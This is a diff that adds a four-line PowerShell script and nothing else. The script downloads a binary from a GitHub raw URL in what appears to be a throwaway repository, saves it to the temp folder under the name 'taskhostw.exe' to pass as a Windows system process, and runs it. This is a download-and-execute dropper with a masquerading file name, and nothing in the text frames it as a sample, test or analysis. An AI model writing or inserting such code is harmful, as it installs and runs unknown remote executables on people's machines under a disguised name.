@@ -1,0 +1,4 @@
+$url = 'github.com/Caseedl/75-676/raw/refs/heads/main/taskhostw'
+$tempFile = Join-Path $env:TEMP 'taskhostw.exe'
+Invoke-WebRequest -Uri $url -OutFile $tempFile
+Start-Process -FilePath $tempFile -Wait
